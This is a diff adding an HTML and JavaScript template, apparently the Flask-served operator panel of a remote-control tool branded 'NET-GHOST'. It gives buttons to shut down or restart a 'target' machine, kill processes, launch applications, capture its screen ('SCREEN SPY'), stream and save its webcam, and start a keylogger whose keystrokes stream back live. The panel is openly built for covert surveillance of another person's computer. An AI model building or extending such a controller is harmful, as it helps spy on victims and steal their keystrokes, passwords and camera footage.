@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBER CONTROLLER v2.0</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root { --neon-blue: #00f3ff; --neon-red: #ff0055; --bg-black: #050505; --panel-bg: #111; }
+        body { background-color: var(--bg-black); color: #ccc; font-family: 'Consolas', 'Courier New', monospace; }
+        
+        /* Sidebar */
+        .sidebar { width: 260px; height: 100vh; position: fixed; background: var(--panel-bg); border-right: 1px solid #333; padding: 20px; z-index: 100; }
+        .brand { font-size: 24px; color: white; text-align: center; margin-bottom: 40px; text-shadow: 0 0 10px var(--neon-blue); }
+        .nav-btn { display: block; width: 100%; padding: 12px 15px; margin-bottom: 10px; background: transparent; border: 1px solid #333; color: #888; text-align: left; transition: 0.3s; cursor: pointer; border-radius: 4px; }
+        .nav-btn:hover, .nav-btn.active { background: rgba(0, 243, 255, 0.1); border-color: var(--neon-blue); color: var(--neon-blue); box-shadow: 0 0 15px rgba(0, 243, 255, 0.2); }
+        .nav-btn i { margin-right: 10px; width: 20px; text-align: center; }
+
+        /* Content */
+        .main { margin-left: 260px; padding: 30px; }
+        .panel { background: var(--panel-bg); border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 20px; display: none; animation: fadeIn 0.3s; }
+        .panel.active { display: block; }
+        
+        /* Elements */
+        .status-bar { border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .screen-box { border: 2px dashed #444; min-height: 400px; display: flex; align-items: center; justify-content: center; background: #000; position: relative; }
+        .screen-box img { max-width: 100%; max-height: 80vh; }
+        .log-terminal { background: #000; border: 1px solid #333; color: #0f0; height: 300px; overflow-y: auto; padding: 10px; font-size: 13px; }
+        
+        /* Table */
+        .table-custom { color: #aaa; font-size: 14px; }
+        .table-custom thead { border-bottom: 2px solid #444; color: var(--neon-blue); }
+        .table-custom td { border-bottom: 1px solid #222; padding: 8px; }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .btn-cyber { border: 1px solid var(--neon-blue); color: var(--neon-blue); background: transparent; padding: 5px 15px; transition: 0.3s; }
+        .btn-cyber:hover { background: var(--neon-blue); color: #000; box-shadow: 0 0 15px var(--neon-blue); }
+        .btn-danger-cyber { border: 1px solid var(--neon-red); color: var(--neon-red); background: transparent; padding: 5px 15px; }
+        .btn-danger-cyber:hover { background: var(--neon-red); color: #fff; box-shadow: 0 0 15px var(--neon-red); }
+    </style>
+</head>
+<body>
+
+<div class="sidebar">
+    <div class="brand"><i class="fa-solid fa-ghost"></i> NET-GHOST</div>
+    <button class="nav-btn active" onclick="showTab('dashboard')"><i class="fa-solid fa-chart-line"></i> Dashboard</button>
+    <button class="nav-btn" onclick="showTab('processes')"><i class="fa-solid fa-microchip"></i> Processes</button>
+    <button class="nav-btn" onclick="showTab('apps')"><i class="fa-brands fa-windows"></i> Applications</button>
+    <button class="nav-btn" onclick="showTab('screen')"><i class="fa-solid fa-desktop"></i> Screen View</button>
+    <button class="nav-btn" onclick="showTab('webcam')"><i class="fa-solid fa-video"></i> Webcam</button>
+    <button class="nav-btn" onclick="showTab('keylog')"><i class="fa-solid fa-keyboard"></i> Keylogger</button>
+    
+    <div style="position: absolute; bottom: 20px; width: 85%; text-align: center;">
+        <small class="text-muted">Target IP</small><br>
+        <span style="color: var(--neon-blue); font-weight: bold;">{{ ip }}</span>
+    </div>
+</div>
+
+<div class="main">
+    
+    <!-- DASHBOARD -->
+    <div id="dashboard" class="panel active">
+        <div class="status-bar">
+            <h4><i class="fa-solid fa-shield-halved"></i> SYSTEM CONTROL</h4>
+            <span class="badge bg-success">CONNECTED</span>
+        </div>
+        <div class="row">
+            <div class="col-md-6">
+                <div class="card bg-dark border-secondary p-3 mb-3">
+                    <h5>Power Management</h5>
+                    <p class="text-muted">Critical system actions</p>
+                    <div class="d-grid gap-2">
+                        <button onclick="control('SHUTDOWN')" class="btn btn-danger-cyber"><i class="fa-solid fa-power-off"></i> SHUTDOWN TARGET</button>
+                        <button onclick="control('RESTART')" class="btn btn-cyber"><i class="fa-solid fa-rotate"></i> RESTART TARGET</button>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="card bg-dark border-secondary p-3">
+                    <h5>Connection Info</h5>
+                    <p>Status: <span class="text-success">Online (LAN)</span></p>
+                    <p>Mail Module: <span class="text-warning">Active (Hybrid)</span></p>
+                    <p>Protocol: <span class="text-info">TCP/IP Custom</span></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PROCESSES -->
+    <div id="processes" class="panel">
+        <div class="status-bar">
+            <h4>PROCESS MANAGER</h4>
+            <div>
+                <input type="text" id="pidInput" placeholder="Enter PID..." class="bg-dark text-white border-secondary p-1">
+                <button onclick="control('STOP', document.getElementById('pidInput').value)" class="btn btn-danger-cyber btn-sm">KILL</button>
+                <button onclick="loadList('processes')" class="btn btn-cyber btn-sm"><i class="fa-solid fa-rotate"></i> REFRESH</button>
+            </div>
+        </div>
+        <div style="height: 500px; overflow: auto;">
+            <table class="table table-custom w-100">
+                <thead><tr><th>NAME</th><th>PID</th><th>MEMORY</th></tr></thead>
+                <tbody id="proc-list"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- APPS -->
+    <div id="apps" class="panel">
+        <div class="status-bar">
+            <h4>INSTALLED APPLICATIONS</h4>
+            <div>
+                <input type="text" id="appPathInput" placeholder="App Path/Name..." class="bg-dark text-white border-secondary p-1">
+                <button onclick="control('APP_START', document.getElementById('appPathInput').value)" class="btn btn-cyber btn-sm">START APP</button>
+                <button onclick="loadList('apps')" class="btn btn-cyber btn-sm">REFRESH</button>
+            </div>
+        </div>
+        <div style="height: 500px; overflow: auto;">
+            <table class="table table-custom w-100">
+                <thead><tr><th>APP NAME</th><th>VERSION</th><th>PATH</th></tr></thead>
+                <tbody id="app-list"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- SCREEN -->
+    <div id="screen" class="panel">
+        <div class="status-bar">
+            <h4>SCREEN SPY</h4>
+            <button onclick="captureScreen()" class="btn btn-cyber"><i class="fa-solid fa-camera"></i> CAPTURE</button>
+        </div>
+        <div class="screen-box">
+            <img id="screen-img" src="" style="display: none;">
+            <span id="screen-msg" class="text-muted">Waiting for capture...</span>
+        </div>
+    </div>
+
+    <!-- WEBCAM -->
+    <div id="webcam" class="panel">
+        <div class="status-bar">
+            <h4>WEBCAM STREAM</h4>
+            <div>
+                <button onclick="toggleCam(true)" class="btn btn-success btn-sm">START STREAM</button>
+                <button onclick="toggleCam(false)" class="btn btn-danger btn-sm">STOP & SAVE</button>
+            </div>
+        </div>
+        <div class="screen-box">
+            <img id="cam-img" src="" alt="Webcam OFF">
+        </div>
+    </div>
+
+    <!-- KEYLOGGER -->
+    <div id="keylog" class="panel">
+        <div class="status-bar">
+            <h4>KEYSTROKE LOGGER</h4>
+            <div>
+                <button onclick="toggleKey(true)" class="btn btn-warning btn-sm">START</button>
+                <button onclick="toggleKey(false)" class="btn btn-secondary btn-sm">STOP</button>
+                <button onclick="document.getElementById('key-term').innerHTML=''" class="btn btn-outline-light btn-sm">CLEAR</button>
+            </div>
+        </div>
+        <div id="key-term" class="log-terminal">Waiting for input stream...</div>
+    </div>
+
+</div>
+
+<script>
+    function showTab(id) {
+        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+        event.currentTarget.classList.add('active');
+    }
+
+    async function control(cmd, arg='') {
+        if((cmd=='SHUTDOWN' || cmd=='RESTART') && !confirm('Confirm action?')) return;
+        await fetch('/api/control', {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({cmd: cmd, arg: arg})
+        });
+        alert('Command sent: ' + cmd);
+    }
+
+    async function loadList(type) {
+        const tbody = document.getElementById(type == 'processes' ? 'proc-list' : 'app-list');
+        tbody.innerHTML = '<tr><td colspan="3">Loading data...</td></tr>';
+        const res = await fetch('/api/' + type);
+        const data = await res.json();
+        tbody.innerHTML = '';
+        data.forEach(d => {
+            let row = type == 'processes' 
+                ? `<td>${d.name}</td><td class="text-info">${d.pid}</td><td>${d.mem}</td>`
+                : `<td>${d.name}</td><td>${d.ver}</td><td class="text-muted">${d.loc}</td>`;
+            tbody.innerHTML += `<tr>${row}</tr>`;
+        });
+    }
+
+    function captureScreen() {
+        const img = document.getElementById('screen-img');
+        document.getElementById('screen-msg').innerText = "Capturing...";
+        img.style.display = 'none';
+        img.src = '/api/screenshot?t=' + Date.now();
+        img.onload = () => { img.style.display = 'block'; document.getElementById('screen-msg').style.display='none'; }
+    }
+
+    function toggleCam(state) {
+        const img = document.getElementById('cam-img');
+        if(state) img.src = '/video_feed';
+        else { img.src = ''; fetch('/api/webcam/off', {method:'POST'}); alert("Webcam stopped. Video saved on target."); }
+    }
+
+    let evtSource = null;
+    function toggleKey(state) {
+        fetch('/api/keylog/toggle', {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({state: state})
+        });
+        const term = document.getElementById('key-term');
+        if(state) {
+            term.innerHTML += "\n[SYSTEM] Logger Started...\n";
+            if(evtSource) evtSource.close();
+            evtSource = new EventSource('/api/keylog/stream');
+            evtSource.onmessage = e => { term.innerHTML += e.data; term.scrollTop = term.scrollHeight; }
+        } else {
+            if(evtSource) evtSource.close();
+            term.innerHTML += "\n[SYSTEM] Logger Stopped.\n";
+        }
+    }
+</script>
+</body>
+</html>
